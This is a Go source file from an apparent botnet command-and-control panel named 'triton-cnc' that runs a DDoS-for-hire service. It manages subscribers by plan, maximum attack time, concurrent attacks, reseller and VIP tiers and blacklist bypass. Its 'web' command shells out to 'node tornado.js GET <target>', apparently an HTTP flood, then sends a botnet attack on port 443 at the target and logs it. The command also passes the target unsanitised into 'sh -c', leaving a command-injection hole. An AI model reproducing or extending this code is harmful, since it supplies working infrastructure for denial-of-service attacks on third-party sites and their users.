package user_Command

import (
	"strconv"
	"strings"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/commands/users/edit"
	"triton-cnc/core/sessions/commands/users/list"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/client/terminal"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/json/meta"
	"fmt"
    "os/exec"
	"triton-cnc/core/attack/launch"
	//"os"

	"golang.org/x/term"
	"log"
)

//
func init() {

	Register(&Command{
		Name: "web",
		Description: "启动带有参数的 Node.js 文件",
		Admin: true, // 或者根据需要设置权限
		Reseller: true,
		Vip: false,
		Execute: handleWebCommand,
	})


	Register(&Command{
		Name:        "user",
		Description: "查看用户信息",
		Admin:      true,
		Reseller:    true,
		Vip:        false,
		Execute: func(session *sessions.Session_Store, cmd []string) error {
			if len(cmd) < 2 {
				session.Channel.Write([]byte("用法: user [username]\r\n"))
				return nil
			}
	
			username := cmd[1]
			user, err := database.GetUser(username)
			if err != nil {
				session.Channel.Write([]byte(fmt.Sprintf("错误: 找不到用户 %s\r\n", username)))
				return nil
			}
	
			// 格式化用户信息并输出
			session.Channel.Write([]byte(fmt.Sprintf("ID: %d\r\n", user.ID)))
			session.Channel.Write([]byte(fmt.Sprintf("用户名: %s\r\n", user.Username)))
			session.Channel.Write([]byte(fmt.Sprintf("管理员: %t\r\n", user.Administrator)))
			session.Channel.Write([]byte(fmt.Sprintf("经销商: %t\r\n", user.Reseller)))
			session.Channel.Write([]byte(fmt.Sprintf("VIP: %t\r\n", user.Vip)))
			session.Channel.Write([]byte(fmt.Sprintf("已封禁: %t\r\n", user.Banned)))
			session.Channel.Write([]byte(fmt.Sprintf("最大攻击时间: %d\r\n", user.Maxtime)))
			session.Channel.Write([]byte(fmt.Sprintf("并发攻击数量: %d\r\n", user.Concurrents)))
			session.Channel.Write([]byte(fmt.Sprintf("最大 Session 数量: %d\r\n", user.MaxSessions)))
			session.Channel.Write([]byte(fmt.Sprintf("节能模式: %t\r\n", user.PowerSavingExempt)))
			session.Channel.Write([]byte(fmt.Sprintf("绕过黑名单: %t\r\n", user.BypassBlacklist)))
			session.Channel.Write([]byte(fmt.Sprintf("计划到期时间: %d\r\n", user.PlanExpiry)))
			session.Channel.Write([]byte(fmt.Sprintf("剩余攻击时间: %d\r\n", user.Cooldown)))
			// ... 输出其他用户信息
			return nil
		},
	})


	Register(&Command{
		Name: "users",

		Description: "edit user feilds",

		Admin: true,
		Reseller: true,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {



			if len(cmd) < 2 {
				list_users.ListUser(Session)
				return nil
			}

			switch cmd[1] {

			case "create", "add":

				if len(cmd) > 2 {
					Session.Channel.Write([]byte("\x1b[0mNote -> Username should be short and easy to remember!\r\n"))

					Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")
	
					Username, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}
	
					Row := database.CheckUser(Username)
					if !Row {
						Session.Channel.Write([]byte("\x1b[0mWarning -> AAAAs user already exists with that username!\r\n"))
						return nil
					}
	
					Session.Channel.Write([]byte("Note -> Password should be long and easy to remember but hard to guess!\r\n"))
	
					Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")
	
					Password, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}

					Preset := GetPreset(cmd[2])
					if Preset == nil {
						Session.Channel.Write([]byte("\x1b[0mWarning -> Plan preset doesn't exist correctly!\r\n"))
						return nil
					}

					added := database.CreateUser(&database.User{
						Username: Username,
						Password: Password,
						NewAccount: true,
						Administrator: Preset.Admin,
						Reseller: Preset.Reseller,
						Vip: Preset.VIP,
						Banned: Preset.Banned,
						Maxtime: Preset.MaxTime,
						Cooldown: Preset.Cooldown,
						Concurrents: Preset.Concurrents,
						MaxSessions: Preset.MaxSessions,
						PowerSavingExempt: Preset.PowerSavingExempt,
						BypassBlacklist: Preset.BypassBlacklist,
						PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(Preset.DefaultDays)).Unix(),
					})

					if added != nil {
						Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
						return nil
					}
					Session.Channel.Write([]byte("\x1b[38;5;2mUser has been correctly created and added into sql\x1b[0m\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("\x1b[0mNote -> Username should be short and easy to remember!\r\n"))

				Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")

				Username, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Row := database.CheckUser(Username)
				if !Row {
					Session.Channel.Write([]byte("\x1b[0mWarning -> A user already exists with that username!\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Password should be long and easy to remember but hard to guess!\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")

				Password, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> MaxTime should be above `0` and below `86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mmaxTime>")

				MaxTime, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				MaxTimeINT, error := strconv.Atoi(MaxTime)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> maxTime must be a int\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Cooldown should be above `0` and below `86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mcooldown>")

				Cooldown, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				CooldownINT, error := strconv.Atoi(Cooldown)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> cooldown must be a int\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Concurrents should be above `0` and below `9999` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mconcurrents>")

				Concurrents, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				ConcurrentsINT, error := strconv.Atoi(Concurrents)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> Concurrents must be a int\r\n"))
					return nil
				}

				

				error = database.CreateUser(&database.User{Username: Username, Password: Password, Maxtime: MaxTimeINT, Cooldown: CooldownINT, Concurrents: ConcurrentsINT, NewAccount: true, Administrator: build.Config.UserDefaults.Admin, Reseller: build.Config.UserDefaults.Reseller, Vip: build.Config.UserDefaults.VIP, Banned: Session.User.Banned, MaxSessions: Session.User.MaxSessions, PowerSavingExempt: Session.User.PowerSavingExempt, BypassBlacklist: Session.User.BypassBlacklist, PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(build.Config.UserDefaults.DefaultDaysLeft)).Unix()})
				if error != nil {
					Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
					return nil
				}
				Session.Channel.Write([]byte("\x1b[38;5;2mUser has been correctly created and added into sql\x1b[0m\r\n"))
				return nil
			case "admin=true":
				users_edit.MakeAdmin(Session, cmd)
				return nil

			case "admin=false":
				users_edit.RemoveAdmin(Session, cmd)
				return nil

			case "reseller=false":
				users_edit.RemoveReseller(Session, cmd)
				return nil

			case "reseller=true":
				users_edit.MakeReseller(Session, cmd)
				return nil

			case "vip=false":
				users_edit.Removevip(Session, cmd)
				return nil

			case "vip=true":
				users_edit.Makevip(Session, cmd)
				return nil

			case "ban":
				users_edit.BanUser(Session, cmd)
				return nil

			case "unban":
				users_edit.RevokeBan(Session, cmd)
				return nil

			case "remove":
				users_edit.RemoveAccount(Session, cmd)
				return nil

			case "powersaving=true":
				users_edit.MakePowerSaving(Session, cmd)
				return nil

			case "powersaving=false":
				users_edit.RevokePowerSavingExempt(Session, cmd)
				return nil

			case "bypassblacklist=true":
				users_edit.MakeBypassBlacklist(Session, cmd)
				return nil

			case "bypassblacklist=false":
				users_edit.RevokeBypassBlacklist(Session, cmd)
				return nil


			}

			StringSep := strings.Split(cmd[1], "=")
			if len(StringSep) <= 1 {
				var CommandCSM = map[string]string {
					"sub_command":cmd[1],
				}
				terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)
				return nil
			}

			switch StringSep[0] {

			case "maxtime":
				users_edit.AttackTimeChange(Session, cmd, StringSep)
				return nil
			case "cooldown":
				users_edit.CooldownTimeChange(Session, cmd, StringSep)
				return nil
			case "concurrents":
				users_edit.ConcurrentChange(Session, cmd, StringSep)
				return nil

			case "maxsessions":
				users_edit.MaxSessionLimitChange(Session, cmd, StringSep)
				return nil

			case "add_days":
				users_edit.AddDays(Session, cmd, StringSep)
				return nil
			case "add_minutes":
				users_edit.AddMinutes(Session, cmd, StringSep)
				return nil
			}

			var CommandCSM = map[string]string {
				"sub_command":cmd[1],
			}
			terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)


			return nil
		},
	})
}

func GetPreset(name string) *meta.Presets {

	for I := 0; I < len(build.PlanPresets.Preset); I++ {
		if name == build.PlanPresets.Preset[I].Name {
			return &build.PlanPresets.Preset[I]
		}
	}

	return nil
}

func handleWebCommand(session *sessions.Session_Store, cmd []string) error {

    if len(cmd) < 3 {
        session.Channel.Write([]byte("用法: web <target> <time>\r\n"))
        return nil
    }

    target := cmd[1]
    timeString := cmd[2]

    // 验证 time 参数



    timeInt, err := strconv.Atoi(timeString)
	//session.Channel.Write([]byte(fmt.Sprintf("%d", session.User.Maxtime)))
    if err != nil {
        session.Channel.Write([]byte("错误: time 必须是整数\r\n"))
        return nil
    }


	if timeInt > session.User.Maxtime{
		session.Channel.Write([]byte("超过最大攻击时间，请输入plan查询您的账户参数。\r\n"))
		return nil
	}

    // 执行 Node.js 命令
    nodeCommand := fmt.Sprintf("node tornado.js GET %s %d 4 64 1000.txt", target, timeInt)
    session.Channel.Write([]byte("攻击已启动\r\n"))

    // 创建 exec.Cmd 对象
    nodecmd := exec.Command("sh", "-c", nodeCommand) 

    // 启动进程
    errstart := nodecmd.Start()
    if errstart != nil {
        session.Channel.Write([]byte(fmt.Sprintf("错误: 无法启动 Node.js 文件: %v\r\n", err)))
    }

    // 立即返回，无需等待 Node.js 进程结束
    session.Channel.Write([]byte("已启动 Node.js 文件 (在后台运行)\r\n"))


	go func()error{



				// 将 timeString 转换为整数
				duration, err := strconv.Atoi(timeString)
				if err != nil {
					// 处理转换错误
					log.Println(err)
					session.Channel.Write([]byte("错误: time 必须是整数\r\n"))
					return nil
				}

	var New = &attack_launch.Attack{
		Target: target,
		Port: "443",
		Duration: strconv.Itoa(duration),
		Method: "web",
	}


	AttackTokenURL := attack_launch.Parse("web", New)
	if AttackTokenURL == "" {
		session.Channel.Write([]byte("\""+"web"+"\" is a unrecognized attack command!\r\n"))
	}

	Allowed := attack_launch.ParseLaunch(AttackTokenURL)
	if !Allowed {
		var CommandCSM = map[string]string{
			"broadcast": strconv.Itoa(0),
			"method":    "web",
			"target":    target,
			"port":      strconv.Itoa(443),
			"duration":  strconv.Itoa(duration), // 将 duration 转换为字符串
		}
		terminal.Banner("attack_failed", session.User, session.Channel, true, false, CommandCSM)
	}

	if Logged, error := database.LogAttack(&database.Attack{
		Username: session.User.Username,
		Target:   target,
		Method:   "web",
		Port:     443,                 // 使用整数 443
		Duration: duration, // 将 duration 转换为字符串
		End:      time.Now().Add(time.Duration(duration) * time.Second).Unix(), 
		Created:  time.Now().Unix(),
	}); error != nil || !Logged {
		log.Println(error)
		session.Channel.Write([]byte("  Failed to correctly log your attack command"))
		return error
	} 


	    // 添加攻击信息显示代码
		session.Attacks++
		var CommandCSM = map[string]string{
			"broadcast": strconv.Itoa(0),
			"method":    "web",
			"target":    target,
			"port":      "443",
			"duration":  timeString,
		}
		if session.CurrentTheme == nil {
			terminal.Banner("attack-sent", session.User, session.Channel, true, false, CommandCSM)
		} else {
			terminal.Banner(strings.Split(session.CurrentTheme.Views_AttackSplash, "/")[1], session.User, session.Channel, true, false, CommandCSM)
			
		}
		return nil
	
	}()



	


	return nil // 添加 return 语句，避免执行后续代码




	



}